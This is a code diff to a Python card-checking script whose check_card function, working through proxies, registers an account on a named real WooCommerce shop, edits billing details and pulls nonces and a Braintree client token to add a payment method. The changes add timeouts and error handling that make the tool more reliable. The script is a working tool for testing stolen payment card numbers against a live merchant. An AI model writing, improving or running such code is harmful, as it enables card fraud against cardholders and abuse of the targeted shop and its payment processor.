@@ -96,8 +96,16 @@ def check_card(card, proxy):
             'sec-fetch-dest': "document",
         }
         
-        response = r.get(url, headers=headers, proxies=proxies)
-        rg = response.text.split('woocommerce-register-nonce" value=')[1].split('"')[1]
+        response = r.get(url, headers=headers, proxies=proxies, timeout=30)
+        
+        # Parse register nonce
+        if 'woocommerce-register-nonce" value=' not in response.text:
+            return {'status': 'error', 'message': 'Failed to get register nonce - site may be blocking', 'card': card}
+        
+        try:
+            rg = response.text.split('woocommerce-register-nonce" value="')[1].split('"')[0]
+        except IndexError:
+            return {'status': 'error', 'message': 'Failed to parse register nonce', 'card': card}
         
         # Step 2: Register
         payload = {
@@ -108,12 +116,19 @@ def check_card(card, proxy):
             'register': "Register"
         }
         
-        response = r.post(url, data=payload, headers=headers, proxies=proxies)
+        response = r.post(url, data=payload, headers=headers, proxies=proxies, timeout=30)
         
         # Step 3: Get billing nonce
         url = "https://www.fantinipelletteria.com/my-account/edit-address/billing/"
-        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies)
-        nonce1 = response.text.split('name="woocommerce-edit-address-nonce" value=')[1].split('"')[1]
+        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, timeout=30)
+        
+        if 'name="woocommerce-edit-address-nonce" value=' not in response.text:
+            return {'status': 'error', 'message': 'Failed to get billing nonce - session may have expired', 'card': card}
+        
+        try:
+            nonce1 = response.text.split('name="woocommerce-edit-address-nonce" value="')[1].split('"')[0]
+        except IndexError:
+            return {'status': 'error', 'message': 'Failed to parse billing nonce', 'card': card}
         
         # Step 4: Update billing
         payload = {
@@ -133,13 +148,17 @@ def check_card(card, proxy):
             'action': "edit_address"
         }
         
-        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, proxies=proxies)
+        response = r.post(url, data=payload, headers=headers, cookies=r.cookies, proxies=proxies, timeout=30)
         
         # Step 5: Get payment nonce and Braintree token
         url = "https://www.fantinipelletteria.com/my-account/add-payment-method/"
-        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies)
-        nonce = response.text.split('name="woocommerce-add-payment-method-nonce" value=')[1].split('"')[1]
-        aut = response.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
+        response = r.get(url, headers=headers, cookies=r.cookies, proxies=proxies, timeout=30)
+        
+        try:
+            nonce = response.text.split('name="woocommerce-add-payment-method-nonce" value="')[1].split('"')[0]
+            aut = response.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
+        except IndexError:
+            return {'status': 'error', 'message': 'Failed to get payment token', 'card': card}
         
         base4 = str(base64.b64decode(aut))
         auth = base4.split('"authorizationFingerprint":')[1].split('"')[1]
